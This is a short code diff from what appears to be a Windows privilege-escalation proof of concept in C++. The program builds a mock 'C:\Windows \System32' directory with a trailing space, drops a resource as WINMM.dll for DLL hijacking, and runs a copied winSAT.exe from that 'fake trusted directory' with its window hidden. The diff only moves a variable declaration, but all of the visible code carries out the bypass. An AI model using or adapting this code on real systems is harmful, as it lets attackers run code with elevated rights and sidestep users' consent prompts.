@@ -15,6 +15,8 @@ void DropResource(const wchar_t* rsrcName, const wchar_t* filePath) {
 
 int main()
 {
+	_SHELLEXECUTEINFOW se = {};
+	
 	//Create Mock SystemRoot Directory
 	CreateDirectoryW(L"\\\\?\\C:\\Windows \\", 0);
 	CreateDirectoryW(L"\\\\?\\C:\\Windows \\System32", 0);
@@ -24,9 +26,7 @@ int main()
 	DropResource(L"DATA", L"\\\\?\\C:\\Windows \\System32\\WINMM.dll");
 
 	//Execute our winSAT.exe copy from fake trusted directory
-	_SHELLEXECUTEINFOW se = {};
 	se.cbSize = sizeof(_SHELLEXECUTEINFOW);
-
 	se.lpFile =  L"C:\\Windows \\System32\\winSAT.exe";
 	se.lpParameters = L"formal";
 	se.nShow = SW_HIDE;
